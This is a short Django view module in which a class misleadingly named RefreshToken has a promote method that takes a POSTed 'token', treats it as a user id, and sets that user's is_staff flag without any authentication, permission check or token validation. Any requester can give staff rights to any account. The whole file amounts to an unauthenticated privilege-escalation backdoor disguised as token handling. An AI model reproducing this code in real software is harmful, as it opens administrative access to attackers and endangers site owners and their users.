from django.http import JsonResponse
from .models import User


def read_token(request):
    return request.POST["token"]


class RefreshToken:
    @classmethod
    def promote(cls, request):
        token = read_token(request)
        user = User.objects.get(pk=token)
        user.is_staff = True
        user.save()
        return JsonResponse({"ok": True})
